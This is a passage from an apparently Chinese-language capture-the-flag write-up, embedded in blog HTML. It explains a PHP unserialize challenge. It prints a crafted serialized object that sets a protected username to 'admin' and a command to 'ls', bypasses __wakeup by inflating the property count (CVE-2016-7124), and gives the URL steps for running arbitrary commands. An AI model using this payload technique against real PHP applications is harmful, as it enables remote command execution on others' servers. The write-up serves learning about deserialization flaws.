+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p>输出：O:3:&ldquo;ctf&rdquo;:2:{s:11:"%00*%00username";s:5:&ldquo;admin&rdquo;;s:6:"%00*%00cmd";s:2:&ldquo;ls&rdquo;;}</p><p>当题目中的代码反序列化我们提交的 code 参数(序列化后的字符串，其实是类) 时，类会先调用构造函数 __construct，从而设置 username 为 admin、cmd 为 ls</p><p>结束时我们的类调用析构函数 __destruct 时，$this->username === &lsquo;admin&rsquo; 就会为 true</p><p>因为 unserialize() 在执行时会检查是否存在 __wakeup() 方法，题目中显然是存在的，所以执行完 __construct 后会再执行 __wakeup，那 $this->username 会再次被赋值为 &lsquo;guest&rsquo;，这里将变量个数修改为大于实际值的数就能够绕过(CVE-2016-7124)，所以最终 poc 为：
+<code>O:3:"ctf":&lt;f>5&lt;/f>:{s:11:"%00\*%00username";s:5:"admin";s:6:"%00\*%00cmd";s:2:"ls";}</code></p><h3 id=0x07-利用>0x07 利用</h3><p>每次本地访问 poc.php?cmd=whoami、poc.php?cmd=ls 生成对应的 poc</p><p>然后访问 index.php?code=O:3:&ldquo;ctf&rdquo;:2:{xxxxxxxxxx} 即可</p></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
